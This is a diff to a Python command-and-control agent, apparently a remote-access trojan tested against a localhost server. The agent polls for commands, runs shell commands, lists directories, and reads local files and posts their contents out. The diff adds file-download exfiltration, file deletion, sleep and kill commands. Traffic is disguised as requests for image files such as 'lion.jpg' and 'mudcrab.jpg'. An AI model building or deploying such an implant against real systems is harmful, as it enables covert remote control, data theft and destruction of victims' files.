@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 
 import requests, os, socket, json, subprocess
+from time import sleep
 
 init = requests.post("http://localhost:8080/initialize/syn", data = {"initialize": "SYN"}, headers={"User-Agent":"Mozilla/5.0"})
 if init.text != 'ACK':
@@ -14,7 +15,13 @@ while True:
     for x in cmdlist:
         cmd = cmdlist[x]
 
-        if cmd == 'ls':
+        if cmd == 'KILL':
+            try:
+                requests.post("http://localhost:8080/assets/ghost.png", data = {"cmd": "KILL"})
+            except:
+                doNothing = True
+            exit(0)
+        elif cmd == 'ls':
             files = os.listdir()
             files.sort()
             list = ''
@@ -23,6 +30,7 @@ while True:
 
             data = {"list": list}
             requests.post("http://localhost:8080/assets/flower.jpg", data=data)
+
         elif cmd == 'pwd':
             data = {"pwd": os.getcwd()}
             requests.post("http://localhost:8080/assets/bug.jpg", data=data)
@@ -52,3 +60,48 @@ while True:
 
             data = {"cmd": command, "output": output}
             requests.post("http://localhost:8080/assets/mudcrab.jpg", data=data)
+
+        elif 'download' in cmd:
+            arr = cmd[9:].split(' ')
+
+            if len(arr) == 1:
+                filename = arr[0]
+                remote_filename = arr[0]
+            elif len(arr) == 2:
+                filename = arr[1]
+                remote_filename = arr[0]
+            else:
+                success = 'False'
+                continue
+
+            if os.path.exists(remote_filename):
+                content = open(filename, 'r').read()
+                success = 'True'
+            else:
+                success = 'False'
+
+            data = {"filename": filename, "remote_filename": remote_filename, "content": content, "success": success}
+            requests.post("http://localhost:8080/assets/lion.jpg", data=data)
+
+        elif 'delete' in cmd:
+            file = cmd[7:]
+
+            if os.path.exists(file):
+                success = 'True'
+                os.remove(file)
+            else:
+                success = 'False'
+
+            data = {"filename": file, "success": success}
+            requests.post("http://localhost:8080/assets/bat.jpg", data=data)
+
+        elif 'sleep' in cmd:
+            try:
+                time = cmd[6:]
+                data = {"sleep": time}
+                requests.post("http://localhost:8080/assets/bear.jpg", data=data)
+                time = int(time)
+                sleep(time)
+            except:
+                data = {"sleep": "False"}
+                requests.post("http://localhost:8080/assets/bear.jpg", data=data)
